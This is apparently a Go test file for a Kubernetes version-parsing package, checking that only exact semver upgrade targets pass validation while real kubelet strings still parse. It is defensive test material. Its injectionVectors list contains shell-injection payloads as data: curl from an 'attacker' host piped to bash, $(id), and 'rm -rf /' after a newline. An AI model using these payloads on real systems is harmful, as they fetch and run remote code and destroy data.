package k8sver

import "testing"

// injectionVectors are the payload classes this package exists to reject as
// targets. Every one of them must be refused before it reaches a shell or a
// node annotation.
var injectionVectors = []string{
	"v1.36.2; curl http://attacker/x | bash",
	"v1.36; curl http://attacker/x | bash", // two-component variant
	"v1.36.$(id)",
	"v1.36.2`id`",
	"v1.36.2 && id",
	"v1.36.2\nrm -rf /", // anchors must not let $ match before a newline
	"v1.36.2\trm -rf /",
	"v1.36.2 --skip-snapshot", // argument smuggling, not shell
}

func TestValidTargetAcceptsExactSemver(t *testing.T) {
	for _, v := range []string{"v1.36.2", "v0.0.0", "v1.0.0", "v10.100.1000", "v2.0.0"} {
		if !ValidTarget(v) {
			t.Errorf("ValidTarget(%q) = false, want true", v)
		}
	}
}

func TestValidTargetRejectsInjection(t *testing.T) {
	for _, v := range injectionVectors {
		if ValidTarget(v) {
			t.Errorf("ValidTarget(%q) = true, want false — injection vector accepted", v)
		}
	}
}

func TestValidTargetRejectsNonExactForms(t *testing.T) {
	for _, v := range []string{
		"",
		"garbage",
		"1.36.2",           // no leading v
		"v1.36",            // no patch
		"v1",               //
		"v1.36.2+build",    // build metadata is fine on a NODE, never on a target
		"v1.31.2+k3s1",     //
		"v1.28.3-eks-a1b2", //
		"v01.36.2",         // leading zero must not alias v1.36.2
		"v1.036.2",         //
		"v1.36.02",         //
		"v-1.36.2",         //
		" v1.36.2",         // surrounding whitespace
		"v1.36.2 ",         //
		"vv1.36.2",         //
		"v1.36.2.3",        //
	} {
		if ValidTarget(v) {
			t.Errorf("ValidTarget(%q) = true, want false", v)
		}
	}
}

func TestParseAcceptsRealKubeletVersions(t *testing.T) {
	// Regression guard for the failure mode that makes a strict parser here
	// dangerous: when these stop parsing, callers lose their watermarks and skip
	// their downgrade and skew gates entirely.
	tests := []struct {
		in   string
		want Version
	}{
		{"v1.36.2", Version{1, 36, 2}},
		{"1.36", Version{1, 36, 0}},
		{"v1.36.2+build", Version{1, 36, 2}},
		{"v1.31.2+k3s1", Version{1, 31, 2}},
		{"v1.28.3-eks-a1b2c3", Version{1, 28, 3}},
		{"v1.30.0-gke.1449000", Version{1, 30, 0}},
		{"v2.0.0", Version{2, 0, 0}},
		{"v99.36.2", Version{99, 36, 2}},
		{"v0.36.2", Version{0, 36, 2}},
	}
	for _, tt := range tests {
		got, ok := Parse(tt.in)
		if !ok || got != tt.want {
			t.Errorf("Parse(%q) = %v,%v want %v,true", tt.in, got, ok, tt.want)
		}
	}
}

func TestParseRejectsUnusable(t *testing.T) {
	for _, v := range []string{"", "garbage", "v1", "v1.x", "vx.36", "v.36.2", "v-1.36.2"} {
		if _, ok := Parse(v); ok {
			t.Errorf("Parse(%q) ok = true, want false", v)
		}
	}
}

// Parse must STAY lenient. This is the invariant that keeps callers' downgrade
// and version-skew gates armed: those gates are guarded on a successfully
// parsed node version, so a Parse that started rejecting real kubelet strings
// would silently disable them rather than reject anything.
//
// Asserted over the kubelet corpus, not the injection corpus — Parse's verdict
// on an injection payload is deliberately unconstrained, because ValidTarget /
// ParseTarget is what gates untrusted input.
func TestParseStaysLenientForKubeletVersions(t *testing.T) {
	for _, v := range []string{
		"v1.36.2", "1.36", "v1.36.2+build", "v1.31.2+k3s1",
		"v1.28.3-eks-a1b2c3", "v1.30.0-gke.1449000", "v1.36.2-rc.1",
	} {
		if _, ok := Parse(v); !ok {
			t.Errorf("Parse(%q) ok = false — leniency lost; callers' skew gates fail OPEN", v)
		}
		if ValidTarget(v) && v != "v1.36.2" {
			t.Errorf("ValidTarget(%q) = true — a suffixed version must not be a valid target", v)
		}
	}
}

func TestMajorIsNotDiscarded(t *testing.T) {
	// Parse must not discard the major: v99.36.2 and v0.36.2 both carry
	// minor 36, but they are not the same cluster's Kubernetes.
	for _, tt := range []struct {
		in    string
		major int
	}{{"v99.36.2", 99}, {"v0.36.2", 0}, {"v1.36.2", 1}} {
		got, ok := Parse(tt.in)
		if !ok || got.Major != tt.major {
			t.Errorf("Parse(%q) major = %d,%v want %d,true", tt.in, got.Major, ok, tt.major)
		}
	}
}

// A component can satisfy the pattern and still overflow an int, so ValidTarget
// alone is not sufficient to trust Parse's numbers. ParseTarget reports both.
func TestParseTargetRejectsOverflowThatValidTargetAccepts(t *testing.T) {
	for _, v := range []string{
		"v99999999999999999999.1.1",
		"v1.99999999999999999999.1",
		"v1.1.99999999999999999999",
	} {
		if !ValidTarget(v) {
			t.Errorf("precondition changed: ValidTarget(%q) is false; this test guards the case where it is true", v)
		}
		if _, ok := ParseTarget(v); ok {
			t.Errorf("ParseTarget(%q) ok = true, want false — an overflowing component must not be trusted", v)
		}
	}
}

func TestParseTargetAgreesWithValidTargetOnNormalInput(t *testing.T) {
	for _, v := range []string{"v1.36.2", "v0.0.0", "v10.100.1000", "v2.0.0"} {
		got, ok := ParseTarget(v)
		if !ok {
			t.Fatalf("ParseTarget(%q) ok = false", v)
		}
		lenient, _ := Parse(v)
		if got != lenient {
			t.Errorf("ParseTarget(%q) = %v but Parse = %v", v, got, lenient)
		}
	}
	for _, v := range append(append([]string{}, injectionVectors...), "v1.36", "v01.36.2", "", "garbage") {
		if _, ok := ParseTarget(v); ok {
			t.Errorf("ParseTarget(%q) ok = true, want false", v)
		}
	}
}

// ParseTarget indexes TargetPattern's capture groups positionally, and
// TargetPattern is exported precisely so it can be edited in lockstep with the
// CRD. Pin the group count so an edit that adds or removes one fails here
// rather than silently remapping major/minor/patch.
func TestTargetPatternHasExactlyThreeGroups(t *testing.T) {
	if n := targetRe.NumSubexp(); n != 3 {
		t.Fatalf("TargetPattern has %d capture groups, want 3 — ParseTarget indexes them positionally", n)
	}
}

// The downgrade gate orders whole versions, so Compare must not stop at the
// minor. v1.36.1 < v1.36.2 is the case that a major/minor-only comparison
// silently called "equal", letting a patch downgrade through.
func TestCompareOrdersOnAllThreeComponents(t *testing.T) {
	tests := []struct {
		a, b string
		want int
	}{
		{"v1.36.2", "v1.36.1", 1},
		{"v1.36.1", "v1.36.2", -1},
		{"v1.36.2", "v1.36.2", 0},
		{"v1.36.0", "v1.35.99", 1},
		{"v2.0.0", "v1.99.99", 1},
		{"v1.36.2", "v1.37.0", -1},
	}
	for _, tt := range tests {
		a, ok1 := ParseTarget(tt.a)
		b, ok2 := ParseTarget(tt.b)
		if !ok1 || !ok2 {
			t.Fatalf("ParseTarget(%q)/%v ParseTarget(%q)/%v", tt.a, ok1, tt.b, ok2)
		}
		if got := a.Compare(b); got != tt.want {
			t.Errorf("%s.Compare(%s) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
		if got := a.Less(b); got != (tt.want < 0) {
			t.Errorf("%s.Less(%s) = %v, want %v", tt.a, tt.b, got, tt.want < 0)
		}
	}
}

// Parse must read the patch off real kubelet strings too, or the downgrade gate
// has nothing to compare against on the node side.
func TestParseReadsPatchFromSuffixedVersions(t *testing.T) {
	for _, tt := range []struct {
		in   string
		want Version
	}{
		{"v1.36.2", Version{1, 36, 2}},
		{"v1.36.2+k3s1", Version{1, 36, 2}},
		{"v1.28.3-eks-a1b2c3", Version{1, 28, 3}},
		{"v1.30.0-gke.1449000", Version{1, 30, 0}},
		{"1.36", Version{1, 36, 0}},    // absent patch reads as .0
		{"v1.36.x", Version{1, 36, 0}}, // unreadable patch reads as .0
	} {
		got, ok := Parse(tt.in)
		if !ok || got != tt.want {
			t.Errorf("Parse(%q) = %v,%v want %v,true", tt.in, got, ok, tt.want)
		}
	}
}
